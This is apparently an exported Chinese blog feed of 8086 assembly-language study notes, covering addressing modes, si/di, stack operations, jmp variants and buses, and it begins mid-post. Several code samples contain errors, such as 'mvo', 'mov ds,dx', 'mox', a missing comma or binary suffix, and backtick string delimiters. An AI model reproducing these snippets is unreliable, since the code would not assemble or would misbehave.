<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:codesg,datasg</span><br><span class="line"></span><br><span class="line">datasg segment</span><br><span class="line">    db &#96;BaSiC&#96;</span><br><span class="line">    db &#96;iNfOrMaTiOn&#96;</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">    start: mov ax,datasg</span><br><span class="line">           mov ds,ax</span><br><span class="line">                        ;设置ds指向datasg段</span><br><span class="line">           mov bx,0</span><br><span class="line">                        ;设置(bx)&#x3D;0,ds:bx指向&#39;BaSiC&#39;的第一个字母</span><br><span class="line">           mov cx,5     ;设置循环次数5</span><br><span class="line">        s: mov al,[bx]</span><br><span class="line">           and al,11011111B     ;将al中的ASCII码的第5位置为0，变为大写字母</span><br><span class="line">           mov [bx],al          ;将转变后的ASCII码写回原单元</span><br><span class="line">           inc bx</span><br><span class="line">           loop s</span><br><span class="line"></span><br><span class="line">           mov bx,5,ds:bx指向&#39;iNfOrMaTiOn&#39;的第一个字母</span><br><span class="line"></span><br><span class="line">           mov cx,11    ;设置循环次数11</span><br><span class="line"></span><br><span class="line">        s0: mov al,[bx]</span><br><span class="line">           or al,00100000       ;将al中的ASCII码的第5位置为1，变成小写字母</span><br><span class="line">           mov [bx],al</span><br><span class="line">           inc bx</span><br><span class="line">           loop s0</span><br><span class="line"></span><br><span class="line">           mov ax 4c00h</span><br><span class="line">           int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h2 id="bx-idata"><a href="#bx-idata" class="headerlink" title="[bx+idata]"></a>[bx+idata]</h2><p>前面我们用<code>[bx]</code>的方式指明一个内存单元，其实还可以使用<code>[bx+idata]</code>来表示一个内存单元，它的偏移地址为<code>(bx)+idata</code>：bx中的数值再加上idata</p>
<p>指令<code>mov ax,[bx+200]</code>的含义：</p>
<blockquote>
<p>将一个内存单元的内容送入ax，这个内存单元的长度为2个字节，存放一个字，偏移地址为bx中的数值加上200，段地址在ds中。即(ax)=((ds)*16+(bx)+200)</p>
</blockquote>
<p>也可写作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[200+bx]</span><br><span class="line">mov ax,200[bx]</span><br><span class="line">mov ax,bx.200</span><br></pre></td></tr></table></figure>

<h2 id="用-bx-idata-的方式进行数组的处理"><a href="#用-bx-idata-的方式进行数组的处理" class="headerlink" title="用[bx+idata]的方式进行数组的处理"></a>用[bx+idata]的方式进行数组的处理</h2><p>通过<code>[bx+idata]</code>，我们可以简化上面大小写转换的程序。通过<code>[0+bx]</code>和<code>[5+bx]</code>的方式在同一循环中定位这两个字符串中的字符。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    mov ax,datasg</span><br><span class="line">    mov ds,ax</span><br><span class="line">    mov bx,0</span><br><span class="line"></span><br><span class="line">    mov cx,5</span><br><span class="line">s:  mov al,[bx]</span><br><span class="line">    and al,11011111b</span><br><span class="line">    mov [bx],al</span><br><span class="line">    mov al,[5+bx]</span><br><span class="line">    or al,00100000b</span><br><span class="line">    mov [5+bx],al</span><br><span class="line">    inc bx</span><br><span class="line">    loop s</span><br></pre></td></tr></table></figure>

<h2 id="SI和DI"><a href="#SI和DI" class="headerlink" title="SI和DI"></a>SI和DI</h2><p>si和di是8086CPU中和bx功能相近的寄存器，si和di不能够分成两个8位寄存器来使用。</p>
<p>下面的三组指令实现了相同的功能。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov ax,[bx]</span><br><span class="line"></span><br><span class="line">mov si,0</span><br><span class="line">mov ax,[si]</span><br><span class="line"></span><br><span class="line">mov di,0</span><br><span class="line">mov ax,[di]</span><br></pre></td></tr></table></figure>

<p>下面的3组指令也实现了相同的功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov ax,[bx+123]</span><br><span class="line"></span><br><span class="line">mov si,0</span><br><span class="line">mov ax,[si+123]</span><br><span class="line"></span><br><span class="line">mov di,0</span><br><span class="line">mov ax,[di+123]</span><br></pre></td></tr></table></figure>

<p>用si和di实现字符串’welcome to masm!’复制到它后面的数据区</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg</span><br><span class="line"></span><br><span class="line">datasg segment</span><br><span class="line">    db &#39;welcome to masm&#39;</span><br><span class="line">    db &#39;...............&#39;</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">    start: mov ax,datasg</span><br><span class="line">           mov ds,dx</span><br><span class="line">           mov si,0</span><br><span class="line">           mov di,16</span><br><span class="line"></span><br><span class="line">           mov cx,8</span><br><span class="line">        s: mov ax,[si]</span><br><span class="line">           mvo [di],ax</span><br><span class="line">           add si,2</span><br><span class="line">           add di,2</span><br><span class="line">           loop s</span><br><span class="line"></span><br><span class="line">           mov ax,4c00h</span><br><span class="line">           int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p>简化版：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">codesg segment</span><br><span class="line">    start: mov ax,datasg</span><br><span class="line">           mov ds,ax</span><br><span class="line">           mov si,0</span><br><span class="line">           mov cx,8</span><br><span class="line"></span><br><span class="line">        s: mov ax,0[si]</span><br><span class="line">           mov 16[si],ax</span><br><span class="line">           add si,2</span><br><span class="line">           loop s</span><br><span class="line"></span><br><span class="line">           mov ax,4c00h</span><br><span class="line">           int 21h</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<h2 id="bx-si-和-bx-di"><a href="#bx-si-和-bx-di" class="headerlink" title="[bx+si]和[bx+di]"></a>[bx+si]和[bx+di]</h2><p><code>[bx+si]</code>和<code>[bx+di]</code>的含义相似，我们以[bx+si]为例进行讲解</p>
<p>指令<code>mov ax,[bx+si]</code>的含义如下：</p>
<blockquote>
<p>将一个内存单元的内容送入ax，这个内存单元的长度为2字节，存放一个字，偏移地址为bx中的数值加上si中的数值，段地址在ds中，即(ax)=((ds)*16+(bx)+(si))</p>
</blockquote>
<p>也可写作<code>mov ax,[bx][si]</code></p>
<h2 id="bx-si-idata-和-bx-di-idata"><a href="#bx-si-idata-和-bx-di-idata" class="headerlink" title="[bx+si+idata]和[bx+di+idata]"></a>[bx+si+idata]和[bx+di+idata]</h2><p>两者含义相似，选一者讲解。</p>
<p>指令<code>mov ax,[bx+si+idata]</code>的含义如下：</p>
<blockquote>
<p>将一个内存单元的内容送入ax，这个内存单元的长度为2字节，存放一个字，偏移地址为bx中的数值加上si中的数值再加上idata，段地址在ds中，即(ax)=((ds)*16+(bx)+(si)+(idata))</p>
</blockquote>
<p>也可写作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,[bx+200+si]</span><br><span class="line">mov ax,[200+bx+si]</span><br><span class="line">mov ax,200[bx][si]</span><br><span class="line">mov ax,[bx].200[si]</span><br><span class="line">mov ax,[bx][si].200</span><br></pre></td></tr></table></figure>





]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（三）</title>
    <url>/2021/02/18/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（三）"><a href="#汇编语言学习（三）" class="headerlink" title="汇编语言学习（三）"></a>汇编语言学习（三）</h1><p>在前两篇中了解了8086CPU的逻辑结构，形成物理地址的方法、相关寄存器以及一些指令。这一篇将从访问内存的角度继续学习几个寄存器。</p>
<h2 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h2><p>CPU中，用16位寄存器来存储一个字。高8位存放高位字节，低8位存放低位字节。在内存中存放时，由于内存单元时字节单元，则一个字要用两个地址连续的内存单元来存放。</p>
<p>字单元的概念：字单元，即存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成。高地址单元中存放字型数据的高位字节，低地址内存单元中存放字型数据的低位字节。</p>
<h2 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h2><p>CPU要读写一个内存单元的时候，必须先给出这个内存单元的地址，在8086PC中，内存地址由段地址和偏移地址组成。8086CPU中有一个DS寄存器，通常用来存放要访问的段地址。例如读取10000H单元的内容，可使用如下的程序段进行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov bx,1000H</span><br><span class="line">mov ds,bx</span><br><span class="line">mov al,[0]</span><br></pre></td></tr></table></figure>
<p>这三条指令将10000H（1000:0）中的数据读到al中。</p>
<p>在这里，mov指令将一个内存单元中的内容送入到一个寄存器中。“[…]”表示一个内存单元，“[…]”中的0表示内存单元的偏移地址。然而仅有一个偏移地址不能定位一个内存单元，因此在指令执行后，8086CPU自动读取ds中的数据作为内存单元的段地址。</p>
<p>此外，8086CPU不支持将数据直接送入段寄存器的操作，ds是一个段寄存器，所以<code>mov ds,1000H</code>这条指令时非法的。</p>
<h2 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h2><p>前面使用mov指令在寄存器和内存之间进行字节型数据的传送。因为8086CPU时16位结构，有16根数据线，可以一次性传送16位数据，即可以一次性传送一个字。</p>
<h2 id="mov、add、sub指令"><a href="#mov、add、sub指令" class="headerlink" title="mov、add、sub指令"></a>mov、add、sub指令</h2><p>mov指令的几种形式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov 寄存器，数据        比如：mov ax,8</span><br><span class="line">mov 寄存器，寄存器      比如：mov ax,bx</span><br><span class="line">mov 寄存器，内存单元    比如：mov ax,[0]</span><br><span class="line">mov 内存单元，寄存器    比如：mov [0],ax</span><br><span class="line">mov 段寄存器，寄存器    比如：mov ds,ax</span><br><span class="line">mov 寄存器，段寄存器    比如：mov ax,ds</span><br></pre></td></tr></table></figure>

<p>add和sub指令同mov一样，都有两个操作对象。它们也有以下几种形式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">add 寄存器，数据        比如：add ax,9</span><br><span class="line">add 寄存器，寄存器      比如：add ax,bx</span><br><span class="line">add 寄存器，内存单元    比如：add ax,[0]</span><br><span class="line">add 内存单元，寄存器    比如：add [0],ax</span><br><span class="line">sub 寄存器，数据        比如：sub ax,9</span><br><span class="line">sub 寄存器，寄存器      比如：sub ax,bx</span><br><span class="line">sub 寄存器，内存单元    比如：sub ax,[0]</span><br><span class="line">sub 内存单元，寄存器    比如：sub [0],ax</span><br></pre></td></tr></table></figure>

<h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>对于8086PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。我们可以将一组长度为N、地址连续、起始地址为16的倍数的内存单元当作专门存储数据的内存空间，从而定义了一个数据段。</p>
<p>比如，将123B0H~123B9H的内存单元定义为数据段。现在累加这个数据段中二定前3个单元中的数据，代码如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,123BH</span><br><span class="line">mox ds,ax       ;将123BH送入ds中，作为数据段的段地址</span><br><span class="line">mov al,0        ；用al存放累加结果</span><br><span class="line">add al,[0]      ；将数据段第一个单元（偏移地址为0）中的数值加到al中</span><br><span class="line">add al,[1]      ；将数据段第二个单元（偏移地址为1）中的数值加到al中</span><br><span class="line">add al,[2]      ；将数据段第三个单元（偏移地址为2）中的数值加到al中</span><br></pre></td></tr></table></figure>

<h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>LIFO</p>
<h2 id="CPU提供的栈机制"><a href="#CPU提供的栈机制" class="headerlink" title="CPU提供的栈机制"></a>CPU提供的栈机制</h2><p>现今的CPU中都有栈的设计，8086CPU也不例外。8086CPU提供相关的指令以栈二定方式访问内存空间。</p>
<p>8086CPU提供入栈和出栈的指令，最基本的两个是<code>PUSH（入栈）</code>和<code>POP（出栈）</code>。比如，<code>push ax</code>表示将寄存器ax中的数据送入栈中，<code>pop ax</code>表示从栈顶取出数据送入ax。8086CPU的入栈和出栈操作都是以字为单位进行的。</p>
<p>在第二篇中提到在CPU中，CS、IP中存放着当前指令的段地址和偏移地址。而在此处，段寄存器SS和寄存器SP，栈顶的段地址存放在SS中，偏移地址存放在SP中。任意时刻，SS:SP总指向栈顶元素。push指令和pop指令执行时，CPU从SS和SP中得到栈顶的位置。</p>
<p><code>push ax</code>的执行由两步完成</p>
<ol>
<li>SP=SP-2，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶；</li>
<li>将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新栈顶。</li>
</ol>
<p><code>pop ax</code>的执行过程和<code>push ax</code>恰好相反</p>
<ol>
<li>将SS:SP指向的内存单元处的数据送入ax中；</li>
<li>SP=SP+2,SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新的栈顶。</li>
</ol>
<h2 id="栈顶超界的问题"><a href="#栈顶超界的问题" class="headerlink" title="栈顶超界的问题"></a>栈顶超界的问题</h2><p>8086CPU用SS和SP指示栈顶的地址，并提供push和pop指令实现入栈和出栈。</p>
<p>假设我们将10010H~1001FH当作栈空间，该栈空间容量为16字节（8字），初始状态为空，SS=1000H、SP=0020H，SS:SP指向10020H；</p>
<p>在执行8次push ax后，向栈中压入8个字，栈满，SS:SP指向10010H；</p>
<p>再次只想<code>push ax</code>：sp=sp-2，SS:SP指向1000EH，栈顶超出了栈空间，ax中的数据送入1000EH单元处，将栈空间外的数据覆盖。</p>
<p>再假设当前状态为满，SS=10000H、SP=0010H，SS:SP指向10010H；</p>
<p>在执行8次<code>pop ax</code>后，从栈中弹出8个字，栈空，SS:SP指向10020H；</p>
<p>再次执行<code>pop ax</code>：sp=sp+2，SS:SP指向10022H，栈顶超出了栈空间。此后，如果再执行push指令，10020H、10021H中的数据将被覆盖。</p>
<h2 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h2><p><code>push</code>和<code>pop</code>指令的格式可以是如下形式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 寄存器       ；将一个寄存器中的数据入栈</span><br><span class="line">pop 寄存器        ；出栈，一个寄存器接收出栈的数据</span><br><span class="line">push 段寄存器       ；将一个段寄存器中的数据入栈</span><br><span class="line">pop 段寄存器        ；出栈，用一个段寄存器接收出栈的数据</span><br><span class="line">push 内存单元       ；将一个内存字单元处的字入栈</span><br><span class="line">pop 内存单元        ；出栈，用一个内存单元接收出栈的数据</span><br></pre></td></tr></table></figure>
<p>比如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">push [0]</span><br><span class="line">pop [2]</span><br></pre></td></tr></table></figure>

<h2 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h2><p>我们可以将长度为N(N&lt;=64KB)的一组地址连续、起始地址为16的倍数的内存单元，当作栈空间来用，从而定义了一个栈段。</p>
<p>一个栈段的容量最大为64KB。因为push、pop等指令在执行的时候只会修改SP，所以栈顶二定变化范围是0~FFFFH，从栈空时的SP=0，一直压栈，直到栈满时SP=0。如果再次压栈，栈顶将环绕，覆盖原来栈中的内容。</p>
]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（一）</title>
    <url>/2021/02/05/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（一）"><a href="#汇编语言学习（一）" class="headerlink" title="汇编语言学习（一）"></a>汇编语言学习（一）</h1><h2 id="汇编语言的组成"><a href="#汇编语言的组成" class="headerlink" title="汇编语言的组成"></a>汇编语言的组成</h2><ol>
<li>汇编指令：机器码的助记符，有对应的机器码</li>
<li>伪指令：没有对应的机器码，由编译器执行，计算机并不执行</li>
<li>其他符号：如+、-、*、/等，由编译器识别，没有对应的机器码</li>
</ol>
<p>汇编语言的核心是汇编指令，它决定了汇编语言的特性。</p>
<h2 id="存储器"><a href="#存储器" class="headerlink" title="存储器"></a>存储器</h2><p>CPU是计算机的核心部件，它控制整个计算机的运作并进行运算。而要想让一个CPU工作，就必须向它提供指令和数据。</p>
<h2 id="指令和数据"><a href="#指令和数据" class="headerlink" title="指令和数据"></a>指令和数据</h2><p>指令和数据是应用上的概念。在内存或磁盘上，指令和数据没有任何区别，都是二进制信息。CPU在工作的时候把有的信息看作指令，有的信息看作数据，为同样的信息赋予了不同的意义。</p>
<p>例如，内存中的二进制信息<code>1000100111011000</code>，计算机可以把它看作大小为<code>89D8H</code>的数据来处理，也可以将其看作指令mov ax,bx来执行。</p>
<blockquote>
<p>1000100111011000 -&gt; 89D8H(数据)</p>
</blockquote>
<blockquote>
<p>1000100111011000 -&gt; mov ax,bx(程序)</p>
</blockquote>
<h2 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h2><p>存储器被划分成若干个存储单元，每个存储单元从0开始顺序编号，例如一个存储器有128个存储单元，编号从0~127。</p>
<p>我们知道电子计算机的最小信息单位是<code>bit</code>，也就是一个二进制位。8个<code>bit</code>组成一个<code>Byte</code>，也就是通常讲的一个字节。微型机存储器的存储单元可以存储一个<code>Byte</code>，即8个二进制位。一个存储器有128个存储单元，它可以存储128个<code>Byte</code>。</p>
<p>微机存储器的容量是以字节为最小单位来计算的。队友拥有128个存储单元的存储器，可以说它的容量是128个字节。</p>
<p>而大容量的存储器还可以使用下列的单位。</p>
<blockquote>
<p>1KB = 1024B       1MB = 1024KB        1GB = 1024MB        1TB = 1024GB</p>
</blockquote>
<p>磁盘的容量同内存一样</p>
<h2 id="CPU对存储器的读写"><a href="#CPU对存储器的读写" class="headerlink" title="CPU对存储器的读写"></a>CPU对存储器的读写</h2><p>存储器被划分为多个存储单元，存储单元从零开始顺序编号。</p>
<p>CPU要从内存中读数据，首先要指定存储单元的地址。也就是要先确定读取哪一个存储单元中的数据。</p>
<p>除此之外，不只有存储器这一器件。CPU在读写数据时还需要指明，他要对哪一个器件进行操作，进行哪种操作，是从中读出数据还是朝里面写入数据。</p>
<p>CPU要想进行数据的读写，必须和外部器件（标准的说法是芯片）进行下面3类信息的交互</p>
<ul>
<li>存储单元的地址（地址信息）</li>
<li>器件的选择，读或写的命令（控制信息）</li>
<li>读或写的数据（数据信息）</li>
</ul>
<p>在计算机中专门有链接CPU和其他芯片的导线，通常称为总线。总线从物理上讲，即为一根根导线的集合。根据传送信息的不同，可分为：地址总线、控制总线和数据总线。</p>
<p>CPU从3号单元中读取数据的过程如下。</p>
<p><img src="https://gitee.com/auxein/images/raw/master/assembly_language/QQ%E6%88%AA%E5%9B%BE20210205171925.png" alt="CPU从内存中读取数据的过程"></p>
<ol>
<li>CPU通过地址线将地址信息3发出</li>
<li>CPU通过控制线发出内存读命令，选中存储器芯片，并通知它，将要从中读取数据。</li>
<li>存储器将3号单元中的数据8通过数据线送入CPU</li>
</ol>
<p>写入操作类似。</p>
<p>然而，要让一个计算机或微处理器工作，应向它输入能驱动它进行工作的电平信息（机器码）</p>
<p>对于8086CPU，下面的机器码则可以完成从3号单元中读取数据</p>
<blockquote>
<p>机器码：101000010000001100000000</p>
</blockquote>
<blockquote>
<p>含义：从三号单元读取数据送入寄存器AX</p>
</blockquote>
<p>汇编指令：</p>
<blockquote>
<p>机器码：10100001 00000011 00000000</p>
</blockquote>
<blockquote>
<p>对应的汇编指令：MOV AX,[3]</p>
</blockquote>
<blockquote>
<p>含义：从三号单元读取数据送入寄存器AX</p>
</blockquote>
<h2 id="地址总线"><a href="#地址总线" class="headerlink" title="地址总线"></a>地址总线</h2><p>CPU通过地址总线来指导那个存储器单元。地址总线上能传送多少个不同的信息，CPU就可以对多少个存储单元进行寻址。</p>
<p>假设一个CPU有10根地址总线。在电子计算机中，一根导线可以传送的稳定状态有高低电平两种。用二进制表示就是0或1，10根导线可以传送10位2进制数据。而10位2进制可以表示从0到1023共计1024个内存单元。</p>
<h2 id="数据总线"><a href="#数据总线" class="headerlink" title="数据总线"></a>数据总线</h2><p>CPU与内存或其他器件之间的数据是通过数据总线来进行的。数据总线的宽度决定了CPU和外界的数据传送速度。8根数据总线一次可传送一个8位二进制数据（即一个字节）。</p>
<h2 id="控制总线"><a href="#控制总线" class="headerlink" title="控制总线"></a>控制总线</h2><p>CPU对外部器件的控制是通过控制总线来进行的。这里的控制总线是个总称，控制总线是一些不同控制线的集合。有多少根控制总线，就意味着CPU提供了对外部器件的多少种控制。控制总线的宽度决定了CPU对外部器件的控制能力。</p>
<h2 id="内存地址空间（概述）"><a href="#内存地址空间（概述）" class="headerlink" title="内存地址空间（概述）"></a>内存地址空间（概述）</h2><p>举例来讲，一个CPU的地址总线宽度为10，那么可以寻址1024个内存单元，这1024个可寻到的内存单元就构成这个CPU的内存地址空间。</p>
<h2 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h2><p>每一个PC机中都有一个主板，主板上有核心器件和一些主要器件，这些器件通过总线相连。这些器件有CPU、存储器、外围芯片组、扩展插槽等。扩展插槽上一般插有RAM内存条和各类接口卡。</p>
<h2 id="接口卡"><a href="#接口卡" class="headerlink" title="接口卡"></a>接口卡</h2><p>计算机系统中，所有可用程序控制其工作的设备，必须受到CPU的控制。CPU对外部设备都不能直接控制，如显示器、音箱、打印机等。直接控制这些设备进行工作的是插在扩展插槽上的接口卡。扩展插槽通过总线和CPU相连，所以接口卡也通过总线同CPU相连。CPU通过总线向接口卡发送命令，接口卡根据CPU的命令控制外设进行工作。</p>
<h2 id="各类存储芯片"><a href="#各类存储芯片" class="headerlink" title="各类存储芯片"></a>各类存储芯片</h2><p>一台PC机中，装有多个存储器芯片，这些存储器芯片从物理连接上看是独立的、不同的器件。从读写属性上看分为两类：随机存储器（RAM）和只读存储器（ROM）。随机存储器可读可写，但必须带电存储，关机后存储的内容丢失。只读存储器只能读取不能写入，关机后其中的内容不丢失。</p>
<p>这些存储器从功能和连接上又可以分为以下几类。</p>
<ul>
<li>随机存储器。<blockquote>
<p>用来存放供CPU使用的绝大部分程序和数据。主随机存储器一般由两个位置上的RAM组成，装在主板上RAM和插在扩展插槽上的RAM。</p>
</blockquote>
</li>
<li>装有BIOS（<em>Basic Input/Output System</em>,基本输入/输出系统）的ROM<blockquote>
<p>BIOS是由主板和各类接口卡（如显卡、网卡等）厂商提供的软件系统，可以通过它利用该硬件设备进行最基本的输入输出。在主板和某些接口卡上插有存储相应BIOS的ROM。例如，主板上的ROM中存储着主板的BIOS（通常称为系统BIOS）；显卡上的ROM中存储着显卡的BIOS。</p>
</blockquote>
</li>
<li>接口卡上的RAM<blockquote>
<p>某些接口卡需要对大批量输入、输出数据进行暂时存储，在其上装有RAM。最典型的是显示卡上的RAM，一般称为现存。显示卡随时将显存中的数据向显示器上输出。</p>
</blockquote>
</li>
</ul>
<h2 id="内存地址空间"><a href="#内存地址空间" class="headerlink" title="内存地址空间"></a>内存地址空间</h2><p>上述存储器在物理上是独立的器件，但是在以下两点相同。</p>
<ul>
<li>都和CPU的总线相连</li>
<li>CPU对它们进行读写的时候都通过控制线发出内存读写命令。</li>
</ul>
<p>CPU在操作它们的时候，把它们都当作内存来对待，把他们总的看作一个由若干存储单元组成的逻辑存储器，这个逻辑存储器就是内存地址空间。CPU在这段地址空间读写数据，实际上就是在相对应的物理存储器中读写数据。</p>
]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（九）</title>
    <url>/2021/03/22/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B9%9D%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（九）"><a href="#汇编语言学习（九）" class="headerlink" title="汇编语言学习（九）"></a>汇编语言学习（九）</h1><p><strong>可以修改IP，或同时修改CS和IP的指令统称为转移指令。</strong></p>
<p>8086CPU的转移行为有以下几类：</p>
<ul>
<li>只修改IP时，称为段内转移，比如：<code>jmp ax</code></li>
<li>同时修改CS和IP时，称为段间转移。比如：<code>jmp 1000:0</code></li>
</ul>
<p>由于转移指令对IP的修改范围不同，段内转移又分为：短转移和近转移。</p>
<ul>
<li>短转移IP的修改范围为-128~127</li>
<li>近转移IP的修改范围为-32768~32767</li>
</ul>
<p>8086CPU的转移指令分为以下几类</p>
<ul>
<li>无条件转移指令</li>
<li>条件转移指令</li>
<li>循环指令</li>
<li>过程</li>
<li>中断</li>
</ul>
<h2 id="操作符-offset"><a href="#操作符-offset" class="headerlink" title="操作符 offset"></a>操作符 offset</h2><p>操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的便宜地址。比如下面的程序：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">    start: mov ax,offset start  ;相当于mov ax,0</span><br><span class="line">        s: mov ax,offset s      ;相当于mov ax,3</span><br><span class="line"></span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>

<p><code>start</code>是代码段中的标号，它所标记的指令是代码段中的第一条指令，偏移地址为0</p>
<p>第一条指令的长度为3个字节，故s的偏移地址是3。</p>
<h2 id="jmp指令"><a href="#jmp指令" class="headerlink" title="jmp指令"></a>jmp指令</h2><p>jmp为无条件转移指令，可以只修改IP，也可以同时修改CS和IP。</p>
<p>jmp指令要给出两种信息：</p>
<ol>
<li>转移的目的地址</li>
<li>转移的距离（段间转移、段内短转移、段内近转移）</li>
</ol>
<h2 id="根据位移进行转移的jmp指令"><a href="#根据位移进行转移的jmp指令" class="headerlink" title="根据位移进行转移的jmp指令"></a>根据位移进行转移的jmp指令</h2><p><code>jmp short 标号（转到标号处执行指令）</code></p>
<p>这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127。转移指令结束后，CS:IP应指向标号处的指令。</p>
<p>CPU在执行jmp指令的时候并不需要转移的目的地址。</p>
<p><code>jmp short 标号</code>的功能为：(IP)=(IP)+8位位移</p>
<ol>
<li>8位位移的标号处地址-jmp指令后第一个字节的地址</li>
<li>short指明此处的位移为8位位移</li>
<li>8位位移的范围为-128~127，用补码表示</li>
<li>8位位移由编译程序在编译时算出</li>
</ol>
<p><code>jmp near ptr 标号</code>的功能为：(IP)=(IP)+16位位移</p>
<ol>
<li>16位位移=标号处的地址-jmp指令后的第一个字节的地址</li>
<li>near ptr指明此处的位移为16位位移，进行的是段内近转移</li>
<li>16位位移的范围为：-32768~32767，用补码表示</li>
<li>16位位移由编译程序在编译时算出</li>
</ol>
<h2 id="转移的目的地址在指令中的jmp指令"><a href="#转移的目的地址在指令中的jmp指令" class="headerlink" title="转移的目的地址在指令中的jmp指令"></a>转移的目的地址在指令中的jmp指令</h2><p><code>jmp far ptr 标号</code>实现的是段间转移，又称远转移</p>
<p>(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址</p>
<p><code>far ptr</code>指明了指令用标号的段地址和偏移地址修改CS和IP</p>
<h2 id="转移地址在寄存器中的jmp指令"><a href="#转移地址在寄存器中的jmp指令" class="headerlink" title="转移地址在寄存器中的jmp指令"></a>转移地址在寄存器中的jmp指令</h2><p>指令格式：<code>jmp 16位reg</code><br>功能：<code>(IP)=(16位reg)</code></p>
<h2 id="转移地址在内存中的jmp指令"><a href="#转移地址在内存中的jmp指令" class="headerlink" title="转移地址在内存中的jmp指令"></a>转移地址在内存中的jmp指令</h2><p>转移地址在内存中的jmp指令有两种格式：</p>
<ol>
<li><p><code>jmp word ptr 内存单元地址</code></p>
</li>
<li><p><code>jmp dword ptr 内存单元地址(段间转移)</code></p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">mov ds:[0],ax</span><br><span class="line">mov word ptr ds:[2],0</span><br><span class="line">jmp dword ptr ds:[0]</span><br></pre></td></tr></table></figure>

<p>执行后，(CS)=0,IP=(0123H)</p>
<h2 id="jcxz指令"><a href="#jcxz指令" class="headerlink" title="jcxz指令"></a>jcxz指令</h2><p>对IP的修改范围：-128~127</p>
<p>指令格式：jcxz 标号(如果(cx)=0，转移到标号处执行。)<br>操作：当(cx)=0时，(IP)=(IP)+8位位移<br>8位位移的标号处地址-jcxz指令后第一个字节的地址<br>8位位移的范围为-128~127，用补码表示<br>8位位移由编译程序在编译时算出</p>
<h2 id="loop指令"><a href="#loop指令" class="headerlink" title="loop指令"></a>loop指令</h2><p>loop指令为循环指令，所有的循环指令都是<strong>短转移</strong>，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为：-128~127</p>
]]></content>
  </entry>
  <entry>
    <title>汇编语言学习（二）</title>
    <url>/2021/02/07/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<h1 id="汇编语言学习（一）"><a href="#汇编语言学习（一）" class="headerlink" title="汇编语言学习（一）"></a>汇编语言学习（一）</h1><p>一个典型的CPU由运算器、控制器、寄存器等器件组成，这些器件靠内部总线相连。前面提及的相对于CPU内部来说是外部总线。内部总线实现CPU内部各个器件之间的联系，外部总线实现CPU和主板上其他器件的联系。在CPU中：</p>
<ul>
<li>运算器进行信息处理</li>
<li>寄存器进行信息存储</li>
<li>控制器控制各种器件进行工作</li>
<li>内部总线连接各种器件，在它们之间进行数据的传送</li>
</ul>
<p>在8086有14个寄存器，每个寄存器都有一个名称。这些寄存器是：AX、BX、CX、DX、SI、DI、SP、BP、IP、CS、SS、DS、ES、PSW。</p>
